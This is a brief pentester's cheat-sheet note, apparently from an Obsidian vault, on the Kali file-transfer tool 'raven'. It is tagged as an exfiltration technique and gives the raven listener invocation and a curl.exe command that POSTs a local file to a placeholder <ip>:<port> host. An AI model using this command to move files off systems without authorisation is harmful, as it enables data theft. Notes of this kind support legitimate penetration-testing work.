---
tags:
  - "#type/tool"
  - "#attack/exfiltration"
Link: https://www.kali.org/tools/raven/
Purpose: download and upload files using http
---
# Info

more advanced alternative:

- [[3 Tools/file-transfer/updog|updog]]

# Usage

`raven <ip> <port>`

Accepts uploads using the POST method.

## Upload file using [[3 Tools/web/cURL|cURL]]

```powershell
curl.exe -X POST -F "file=@<filepath>" http://<ip>:<port>/
```

# Snippets
